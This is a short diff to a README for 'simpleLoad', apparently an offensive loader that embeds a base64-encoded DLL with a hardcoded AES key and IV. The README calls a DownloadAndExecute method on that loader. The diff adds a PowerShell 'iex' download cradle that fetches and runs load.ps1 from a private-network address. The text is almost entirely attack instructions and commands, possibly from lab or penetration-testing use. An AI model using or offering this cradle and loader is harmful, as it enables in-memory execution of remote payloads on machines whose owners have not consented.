@@ -1,5 +1,5 @@
 # simpleLoad
-Compile it as 32bit architecture, copy the base64 dll to $encodeStr
+Compile it as 32bit architecture, copy the base64 of the dll to $encodeStr
 
 ```bash
 $ cat simpleLoad.dll | xclip -sel c
@@ -25,4 +25,9 @@ $AESKey = "D(G+KbPeShVmYq3t"
 $AESIV = "8y/B?E(G+KbPeShV"
 
 [simpleLoad.Program]::DownloadAndExecute($url, $AESKey, $AESIV)
+```
+
+Run it with
+```powershell
+iex(new-object system.net.webclient).downloadstring('http://192.168.49.53/load.ps1')
 ```
